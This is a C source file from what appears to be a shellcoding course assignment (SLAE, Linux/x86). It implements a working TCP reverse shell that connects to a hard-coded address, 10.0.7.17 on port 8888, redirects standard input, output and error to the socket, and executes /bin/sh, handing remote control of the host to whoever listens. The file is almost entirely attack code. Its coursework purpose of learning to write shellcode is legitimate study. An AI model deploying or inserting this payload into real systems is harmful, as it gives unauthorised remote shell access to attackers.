// Student ID: SLAE-1250
// Student Name: Jonathan "Chops" Crosby
// Assignment 2: Reverse Shell TCP (Linux/x86) C variant

// Higher level version of reverse shell in
// order to eventually map it to needed assembly

// compile with: gcc reverse-shell-tcp.c -o reverse-shell-tcp

#include <stdio.h>
#include <unistd.h> /*needed for execve */
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h> /* memset */

//used examples from the following URLs to work out the C code
//https://www.thegeekstuff.com/2011/12/c-socket-programming/?utm_source=feedburner
int main(int argc, char *argv[])
{
	//local vars
	int socketid;
	char *ipAddress = "10.0.7.17";
	int portNumber = 8888;

	//struct to hold all the info needed to bind
	struct sockaddr_in serverAddress;

	//clear out the memory in the struct
	memset(&serverAddress, '0', sizeof(serverAddress));

	//http://man7.org/linux/man-pages/man7/ip.7.html
	//AF_INET is the address family and is always set to AF_INET
	serverAddress.sin_family = AF_INET;

	//https://linux.die.net/man/3/htonl
	//http://man7.org/linux/man-pages/man7/ip.7.html
	//http://pubs.opengroup.org/onlinepubs/009695399/functions/inet_addr.html
	serverAddress.sin_addr.s_addr = inet_addr(ipAddress);

	//https://linux.die.net/man/3/htons
	serverAddress.sin_port = htons(portNumber);

	//http://man7.org/linux/man-pages/man2/socket.2.html
	//create a new TCP socket and associate it to our server File Descriptor
			     //socket(int domain, int type   , int protocol);
			     //AF_INET     - http://man7.org/linux/man-pages/man2/socket.2.html
			     //SOCK_STREAM - http://man7.org/linux/man-pages/man2/socket.2.html
			     //IPPROTO_IP  - http://man7.org/linux/man-pages/man7/ip.7.html
	socketid = socket(AF_INET,SOCK_STREAM,IPPROTO_IP);

	//http://man7.org/linux/man-pages/man2/connect.2.html
	connect(socketid,(struct sockaddr *)&serverAddress, sizeof(serverAddress));

	//we now need to duplicate the file descriptors from standard
	//0, 1 and 2 to our newely connected client
	int i; //needed to get around C99 mode
	for(i=0; i<=2; i++)
	{
		dup2(socketid, i);
	}

	//now that all of our file descriptors are duplicated
	//we need to execute /bin/sh, which will touch the standard
	//file descriptors ... that will then be associated to the
	//the connected client

	//execute "/bin/sh"
	//http://man7.org/linux/man-pages/man2/execve.2.html
	execve("/bin/sh", NULL, NULL);
}
